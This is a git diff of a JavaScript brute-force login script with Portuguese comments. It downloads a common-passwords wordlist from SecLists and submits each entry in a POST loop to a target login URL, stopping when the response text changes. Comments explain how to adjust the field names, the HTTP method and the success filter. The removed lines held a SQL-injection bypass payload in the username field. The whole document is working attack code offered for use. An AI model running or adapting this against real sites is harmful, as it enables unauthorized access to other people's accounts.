@@ -1,10 +1,8 @@
 // usar apenas uma wordlist por vez
 // evitar localhost e ngrok, a idéia aqui é poupar armazenamento interno
-// existem hospedagens gratuitas para subur uma wordlist
+// existem hospedagens gratuitas para subir uma wordlist
 
-// https://gitlab.com/kalilinux/packages/routersploit/-/raw/792f589158456d04ba9a2f3216353be9c3641398/routersploit/resources/wordlists/usernames.txt
-
-   const url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';
+const url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';
 
 fetch(url)
   .then(res => res.text())
@@ -12,25 +10,31 @@ fetch(url)
     const passwords = text.split('\n').map(p => p.trim()).filter(Boolean);
 
     // ajustar a url do alvo antes de enviar
+    // to pensando em adaptar com input no console ou com prompt para a próxima versão
     const loginUrl = 'https://alvo.com/login';
 
     (async () => {
       for (const password of passwords) {
-        console.log(`Testando: ${password}`);
+        console.warn(`testando: ${password}`);
 
         const res = await fetch(loginUrl, {
-          method: 'POST',
+          method: 'POST', //atenção aqui! Na maioria das vezes é POST, mas nem sempre... talvez eu coloque para declarar no início tbm
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
-          body: `username=adimin' OR '1=1&password=${encodeURIComponent(password)}`
-        }); // ajustar o user/username e pass/password aqui
+      //  ajustar o user/username e pass/password aqui
+          body: `username=${encodeURIComponent(password)}&password=`
+      //  body: `username=&password=${encodeURIComponent(password)}`
+      //  body: `user=${encodeURIComponent(password)}&pass=`
+      //  body: `user=&pass=${encodeURIComponent(password)}`
+      //  sim... pura gambiarra. Podia fazer melhor? Podia! kkk
+        });
 
 
         const body = await res.text();
-        // ajustar filtro de parada
-        if (!body.toLowerCase().includes('username')) {
-          console.log(`ENCONTRADO: ${password}`);
+        // ajustar filtro de parada, não me julguém, eu acho esse método mais eficiente na maioria dos casos
+        if (!body.toLowerCase().includes('user')) {
+          console.log(`sucesso: %c${password}`, `color: green`);
           break;
         }
       }
